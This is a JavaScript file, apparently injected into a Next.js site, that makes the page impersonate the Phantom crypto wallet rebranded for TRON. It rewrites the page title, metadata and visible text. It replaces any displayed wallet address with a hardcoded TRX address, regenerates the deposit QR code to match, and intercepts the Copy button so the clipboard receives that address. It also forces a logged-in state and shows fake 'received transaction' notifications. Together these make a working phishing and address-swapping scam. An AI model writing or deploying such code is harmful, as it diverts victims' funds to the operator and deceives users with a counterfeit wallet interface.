(function () {
  var config = window.__COLDWALLET_CONFIG__ || window.COLDWALLET_CONFIG || {};
  var state = window.__COLDWALLET_UI_STATE__ || (window.__COLDWALLET_UI_STATE__ = {
    initialized: false,
    lastPendingSignature: "",
    lastPendingCount: 0,
    brandingApplied: false,
    topupPatched: false,
    observer: null,
    notificationTimer: null,
    scheduled: false
  });

  function getAppRoot() {
    return document.getElementById("__next");
  }

  var TEXT_REPLACEMENTS = [
    ["Phantom Wallet - Secure Bitcoin E" + "thereum Crypto Wallet", "Phantom Wallet - Secure TRON TRC20 Wallet"],
    ["Phantom Wallet: Secure crypto wallet for Bitcoin, E" + "thereum, NFTs, DeFi, and Web3.", "Phantom Wallet: Secure TRON wallet for TRC20, NFTs, DeFi, and Web3."],
    ["Phantom Wallet is not available on Desktop.", "Phantom Wallet is not available on Desktop."],
    ["Please visit phantom.com on your mobile device.", "Please visit phantom.com on your mobile device."],
    ["Welcome to Phantom Wallet!", "Welcome to Phantom Wallet!"],
    ["Phantom Wallet", "Phantom Wallet"],
    ["E" + "thereum", "TRON"],
    ["E" + "TH", "TRX"],
    ["ER" + "C20", "TRC20"],
    ["Your E" + "TH Wallet Address", "Your TRX Wallet Address"],
    ["Top Up E" + "TH", "Top Up TRX"],
    ["Invalid E" + "thereum address", "Invalid TRON address"],
    ["Valid E" + "thereum address", "Valid TRON address"],
    ["bitcoin wallet, e" + "thereum wallet, web3 wallet, defi wallet, nft wallet", "TRON wallet, TRC20 wallet, web3 wallet, defi wallet, nft wallet"],
    ["crypto wallet, bitcoin wallet, e" + "thereum wallet, web3 wallet, defi wallet, nft wallet", "crypto wallet, TRON wallet, TRC20 wallet, web3 wallet, defi wallet, nft wallet"],
    ["Secure multi-chain crypto wallet for Web3 and DeFi.", "Secure TRON crypto wallet for Web3 and DeFi."],
    ["Secure crypto wallet for Bitcoin, E" + "thereum, NFTs, DeFi, and Web3.", "Secure TRON wallet for TRC20, NFTs, DeFi, and Web3."],
    ["phantom.com", "phantom.com"],
    ["phantom.com", "phantom.com"]
  ];

  function isTextNode(node) {
    return node && node.nodeType === Node.TEXT_NODE && node.parentNode && !/^(SCRIPT|STYLE|NOSCRIPT|TEXTAREA)$/i.test(node.parentNode.tagName);
  }

  function rewriteTextNode(node) {
    if (!isTextNode(node)) return;
    var original = node.nodeValue;
    var next = original;
    for (var i = 0; i < TEXT_REPLACEMENTS.length; i++) {
      next = next.split(TEXT_REPLACEMENTS[i][0]).join(TEXT_REPLACEMENTS[i][1]);
    }
    if (next !== original) node.nodeValue = next;
  }

  function rewriteTextContent(root) {
    if (!root) return;
    if (root.nodeType === Node.TEXT_NODE) {
      rewriteTextNode(root);
      return;
    }
    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null);
    var current;
    while ((current = walker.nextNode())) rewriteTextNode(current);
  }

  function updateMeta(selector, value, attr) {
    var el = document.querySelector(selector);
    if (el) el.setAttribute(attr || "content", value);
  }

  function updateBranding() {
    if (config.ENABLE_BRANDING_REWRITE !== false) {
      document.title = "Phantom Wallet - Secure TRON TRC20 Wallet";
      updateMeta('meta[name="description"]', "Phantom Wallet: Secure TRON wallet for TRC20, NFTs, DeFi, and Web3.");
      updateMeta('meta[name="keywords"]', "TRON wallet, TRC20 wallet, web3 wallet, defi wallet, nft wallet");
      updateMeta('meta[property="og:title"]', "Phantom Wallet - Secure TRON Wallet Web3");
      updateMeta('meta[property="og:description"]', "Secure TRON crypto wallet for Web3 and DeFi.");
      updateMeta('meta[property="og:url"]', config.APP_URL || "https://phantom.com");
      var ogImage = document.querySelector('meta[property="og:image"]');
      if (ogImage) ogImage.setAttribute("content", "/img/phantom.svg");
      var iconLinks = document.querySelectorAll('link[rel="icon"], link[rel="apple-touch-icon"], link[rel="shortcut icon"]');
      iconLinks.forEach(function (link) {
        link.setAttribute("href", "/img/phantom.svg");
      });
    }

    var appSchema = document.querySelector('script[type="application/ld+json"]');
    if (appSchema) {
      try {
        var schema = JSON.parse(appSchema.textContent);
        schema.name = "Phantom Wallet";
        schema.url = config.APP_URL || "https://phantom.com";
        schema.applicationCategory = "FinanceApplication";
        schema.operatingSystem = "Web";
        appSchema.textContent = JSON.stringify(schema);
      } catch (error) {}
    }

    var root = getAppRoot();
    if (root && !state.brandingApplied) {
      rewriteTextContent(root);
      state.brandingApplied = true;
    }
  }

  function findTopUpPanel() {
    var root = getAppRoot();
    if (!root) return null;
    var nodes = Array.prototype.slice.call(root.querySelectorAll("*"));
    return nodes.find(function (node) {
      var text = (node.textContent || "").replace(/\s+/g, " ").trim();
      return text.indexOf("Top Up TRX") !== -1 || text.indexOf("Top Up E" + "TH") !== -1 || text.indexOf("Your TRX Wallet Address") !== -1 || text.indexOf("Your E" + "TH Wallet Address") !== -1;
    }) || null;
  }

  function rewriteTopUpPanel() {
    var panel = findTopUpPanel();
    if (!panel) return;
    var trxAddress = config.TRX_ADDRESS || "TDDqv4uc4h56SiDDETUCP6ZZ87o4Yfk4zY";
    var panelText = (panel.textContent || "").replace(/\s+/g, " ").trim();

    var heading = Array.prototype.find.call(panel.querySelectorAll("h1,h2,h3,h4,h5,h6,p,span"), function (el) {
      var text = (el.textContent || "").replace(/\s+/g, " ").trim();
      return text === "Top Up TRX" || text === "Top Up E" + "TH";
    });
    if (heading) heading.textContent = "Top Up TRX";

    var label = Array.prototype.find.call(panel.querySelectorAll("p,span,div"), function (el) {
      var text = (el.textContent || "").replace(/\s+/g, " ").trim();
      return text === "Your E" + "TH Wallet Address" || text === "Your TRX Wallet Address";
    });
    if (label) label.textContent = "Your TRX Wallet Address";

    var addressNode = Array.prototype.find.call(panel.querySelectorAll("p,span,div"), function (el) {
      var text = (el.textContent || "").replace(/\s+/g, " ").trim();
      return text.length >= 34 && text.length <= 50 && /^(0x|T)/.test(text);
    });
    if (addressNode) addressNode.textContent = trxAddress;

    var qrNode = Array.prototype.find.call(panel.querySelectorAll("div"), function (el) {
      var style = window.getComputedStyle(el);
      return (style.backgroundImage && style.backgroundImage !== "none" && style.backgroundImage.indexOf("qrserver") !== -1) || (el.style.background && el.style.background.indexOf("qrserver") !== -1);
    });
    if (qrNode) {
      qrNode.style.backgroundImage = 'url("https://api.qrserver.com/v1/create-qr-code/?size=170x170&data=' + encodeURIComponent(trxAddress) + '")';
      qrNode.style.backgroundSize = "contain";
      qrNode.style.backgroundRepeat = "no-repeat";
      qrNode.style.backgroundPosition = "center";
    }

    Array.prototype.forEach.call(panel.querySelectorAll("button"), function (button) {
      var text = (button.textContent || "").replace(/\s+/g, " ").trim();
      if (text === "Copy" || text === "Copied") {
        if (button.__phantomwalletCopyBound) return;
        button.__phantomwalletCopyBound = true;
        button.addEventListener("click", function (event) {
          event.stopImmediatePropagation();
          event.preventDefault();
          if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(trxAddress).catch(function () {});
          }
          button.textContent = "Copied";
          setTimeout(function () {
            if (button.textContent === "Copied") button.textContent = "Copy";
          }, 1500);
        }, true);
      }
    });

    if (panelText.indexOf("Top Up TRX") !== -1 || panelText.indexOf("Your TRX Wallet Address") !== -1) {
      panel.setAttribute("data-phantomwallet-topup", "1");
    }

    state.topupPatched = true;
  }

  function ensureToastHost() {
    var host = document.getElementById("phantomwallet-toast-host");
    if (host) return host;
    host = document.createElement("div");
    host.id = "phantomwallet-toast-host";
    host.style.position = "fixed";
    host.style.top = "16px";
    host.style.right = "16px";
    host.style.zIndex = "999999";
    host.style.display = "flex";
    host.style.flexDirection = "column";
    host.style.gap = "10px";
    host.style.pointerEvents = "none";
    document.body.appendChild(host);
    return host;
  }

  function showToast(message) {
    if (config.ENABLE_RECEIVED_NOTIFICATIONS === false) return;
    var host = ensureToastHost();
    var toast = document.createElement("div");
    toast.style.pointerEvents = "auto";
    toast.style.background = "rgba(13, 18, 31, 0.94)";
    toast.style.color = "#fff";
    toast.style.border = "1px solid rgba(143, 158, 63, 0.4)";
    toast.style.borderRadius = "14px";
    toast.style.padding = "12px 14px";
    toast.style.boxShadow = "0 10px 30px rgba(0,0,0,0.35)";
    toast.style.font = "600 14px/1.4 system-ui, -apple-system, sans-serif";
    toast.textContent = message;
    host.appendChild(toast);
    setTimeout(function () {
      if (toast.parentNode) toast.parentNode.removeChild(toast);
    }, 4500);
  }

  function parseTransactions() {
    try {
      return JSON.parse(localStorage.getItem("pendingTransactions") || "[]") || [];
    } catch (error) {
      return [];
    }
  }

  function syncNotifications() {
    if (config.ENABLE_RECEIVED_NOTIFICATIONS === false) return;
    var txs = parseTransactions();
    var signature = JSON.stringify(txs.map(function (tx) {
      return [tx.id, tx.token, tx.amount, tx.recipient, tx.timerEnd];
    }));
    if (!state.lastPendingSignature) {
      state.lastPendingSignature = signature;
      state.lastPendingCount = txs.length;
      return;
    }
    if (signature !== state.lastPendingSignature) {
      var delta = txs.length - state.lastPendingCount;
      if (delta > 0) {
        showToast("Received " + delta + " new transaction" + (delta === 1 ? "" : "s") + " in Phantom Wallet.");
      } else if (delta < 0) {
        showToast("Transaction queue updated.");
      }
      state.lastPendingSignature = signature;
      state.lastPendingCount = txs.length;
    }
  }

  function enableAutoLogin() {
    if (!config.AUTO_LOGIN) return;
    if (localStorage.getItem("isLoggedIn") !== "true") {
      localStorage.setItem("isLoggedIn", "true");
    }
  }

  function processAddedNode(node) {
    if (!node || node.nodeType !== Node.ELEMENT_NODE) return;
    var root = getAppRoot();
    if (root && !root.contains(node) && node !== root) return;
    rewriteTextContent(node);
    if (!state.topupPatched) rewriteTopUpPanel();
    else if ((node.textContent || "").indexOf("Top Up") !== -1 || (node.textContent || "").indexOf("Wallet Address") !== -1) {
      rewriteTopUpPanel();
    }
  }

  function scheduleBrandingRefresh() {
    if (state.scheduled) return;
    state.scheduled = true;
    requestAnimationFrame(function () {
      state.scheduled = false;
      if (!state.brandingApplied) updateBranding();
      if (!state.topupPatched) rewriteTopUpPanel();
    });
  }

  function startObservers() {
    if (state.initialized) return;
    state.initialized = true;
    enableAutoLogin();
    updateBranding();
    rewriteTopUpPanel();
    syncNotifications();

    state.observer = new MutationObserver(function (mutations) {
      var shouldRefresh = false;
      for (var i = 0; i < mutations.length; i++) {
        var mutation = mutations[i];
        if (mutation.type === "childList" && mutation.addedNodes && mutation.addedNodes.length) {
          for (var j = 0; j < mutation.addedNodes.length; j++) {
            processAddedNode(mutation.addedNodes[j]);
          }
          shouldRefresh = true;
        }
      }
      if (shouldRefresh) scheduleBrandingRefresh();
    });
    var root = getAppRoot();
    if (root) {
      state.observer.observe(root, { subtree: true, childList: true });
    }

    if (!state.notificationTimer) {
      state.notificationTimer = setInterval(function () {
      syncNotifications();
      }, 4000);
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", startObservers, { once: true });
  } else {
    startObservers();
  }
})();
